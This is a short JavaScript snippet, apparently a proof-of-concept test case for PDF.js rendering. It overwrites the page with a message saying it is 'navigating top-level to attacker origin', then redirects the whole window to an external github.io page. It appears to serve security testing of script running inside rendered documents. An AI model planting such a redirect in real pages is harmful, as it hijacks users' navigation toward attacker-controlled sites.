(function () {
  document.documentElement.innerHTML =
    "<pre style='font:12px monospace'>on " + location.origin + ", navigating top-level to attacker origin...</pre>";
  setTimeout(function () {
    location.href = "https://davidxbors.github.io/pdfjs-render-testcase/topnav.html?cb=" + Math.random();
  }, 1200);
})();
